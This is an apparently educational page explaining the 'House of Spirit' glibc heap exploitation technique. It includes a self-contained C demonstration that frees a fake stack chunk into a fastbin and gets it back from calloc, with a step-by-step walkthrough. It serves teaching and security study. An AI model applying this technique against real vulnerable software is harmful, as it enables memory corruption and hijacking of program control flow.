#import "../../../../../typst-theme.c.typ": project
#show: project

#metadata(
  (
    title: "House of Spirit",
    description: "An attack that tricks free() into adding a non-heap pointer (e.g., a stack address) to a fastbin, leading to an arbitrary allocation.",
    date: "2025-12-13",
    order: 23,
  ),
)<frontmatter>

= glibc Allocator: House of Spirit

== Introduction

The "House of Spirit" is a heap exploitation technique where an attacker crafts a fake chunk in a controlled memory region (like the stack or .bss) and tricks the allocator into `free()`-ing it. This places the attacker-controlled memory region into a bin (typically a fastbin), from which it can be allocated by a subsequent `malloc` call. The result is a `malloc` call that returns a pointer to a location the attacker already controls, enabling trivial overwrites of critical data like saved return addresses.

The required primitives are:
1. The address of the target memory region must be known.
2. The attacker must have the ability to write to this memory region to craft the fake chunk.

== Prerequisites
- *Known Target Address*: The attacker needs to know the address of the memory region they want to allocate (e.g., via a stack leak).
- *Write Primitive*: Ability to write data to the target memory region to create a fake chunk header (specifically the `size` field and the `size` of the *next* chunk).
- *Free Primitive*: Ability to pass the pointer of the fake chunk to `free()`.
- *T-cache Exhaustion*: On modern glibc, the t-cache for the target size must be full so that the `free()` places the chunk into the fastbin.

== Example from `house_of_spirit.c`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
	setbuf(stdout, NULL);

	void *chunks[7];
	for(int i=0; i<7; i++) {
		chunks[i] = malloc(0x30);
	}
	for(int i=0; i<7; i++) {
		free(chunks[i]);
	}

	long fake_chunks[10] __attribute__ ((aligned (0x10)));
	fake_chunks[1] = 0x40; // size
	fake_chunks[9] = 0x1234; // nextsize

	void *victim = &fake_chunks[2];
	free(victim);

	for(int i=0; i<7; i++) {
		malloc(0x30);
	}

	void *allocated = calloc(1, 0x30);

	assert(allocated == victim);
	return 0;
}
```

== Attack Flow Explained

=== 1. Prepare the Bins

For this attack to work on a fastbin, we must bypass the t-cache. We do this by completely filling the t-cache bin for the size we intend to use (`0x40`).

```c
for(int i=0; i<7; i++) {
	chunks[i] = malloc(0x30); // Allocates a 0x40-sized chunk
}
for(int i=0; i<7; i++) {
	free(chunks[i]);
}
```
Now, the t-cache bin for size `0x40` is full. Any subsequent `free()` of a `0x40` chunk will cause it to be placed in the corresponding fastbin.

=== 2. Craft the Fake Chunk

The core of the attack is creating a fake chunk structure in a controlled memory region (in this case, the `fake_chunks` array on the stack). For `free()` to accept this chunk, it must pass a few integrity checks.

#figure(
  table(
    columns: (auto, auto, auto, auto),
    inset: 10pt,
    align: center,
    [*Array Index*], [*Stack Address*], [*Content*], [*Note*],
    [`fake_chunks[0]`], `...`, `...`, [Previous chunk's data],
    [*`fake_chunks[1]`*], `...`, [`0x40`], [Fake chunk *size* field. Must be a valid fastbin size.],
    [*`fake_chunks[2]`*], `...`, `...`, [Start of user data. `victim` points here.],
    [`...`], `...`, `...`, `...`,
    [*`fake_chunks[9]`*], `...`, [`0x1234`], [Size of the *next* chunk. Must be a sane value to pass checks.],
  ),
  caption: [Layout of the fake chunk on the stack. The pointer passed to `free` points *after* the size field.],
)

- We set `fake_chunks[1]` to `0x40`. This serves as the `size` field of our fake chunk. The pointer we will `free()` is `&fake_chunks[2]`, so the allocator will look at the memory address just before it (`&fake_chunks[1]`) to find the size.
- We set `fake_chunks[9]` to `0x1234`. When `free()` is called on a fastbin-sized chunk, it performs a check on the *next* chunk's size to prevent certain types of corruption. `0x1234` is a "sane" size that will pass this check.

=== 3. Freeing the Fake Chunk

With the t-cache full and the fake chunk crafted, we can now call `free()` on our `victim` pointer.

```c
void *victim = &fake_chunks[2];
free(victim);
```
The allocator checks the t-cache, finds it full, and proceeds to the fastbin logic. Our fake chunk passes the necessary checks and is added to the head of the `0x40` fastbin.

#figure(
  table(
    columns: (auto, auto),
    inset: 10pt,
    align: center,
    [*Bin*], [*State*],
    [Fastbin (0x40)], "[ `victim` (our fake chunk) ]",
  ),
  caption: [The fastbin now contains a pointer to our fake chunk on the stack.],
)


=== 4. Allocating the Fake Chunk

The final step is to retrieve the pointer from `malloc`. First, we must empty the t-cache so that `malloc` will look in the fastbin.

```c
// Empty the tcache
for(int i=0; i<7; i++) {
	malloc(0x30);
}

// Allocate from the fastbin
void *allocated = calloc(1, 0x30);
```

The `malloc` call requests a `0x30`-byte chunk (which rounds up to a `0x40` internal size), finds the t-cache empty, and pulls the next available chunk from the fastbin—which is our fake chunk. The `assert(allocated == victim)` passes, confirming that we have received a `malloc`-returned pointer that points directly to our controlled stack memory. An attacker can now use this pointer to overwrite saved function parameters, return addresses, or anything else on the stack.

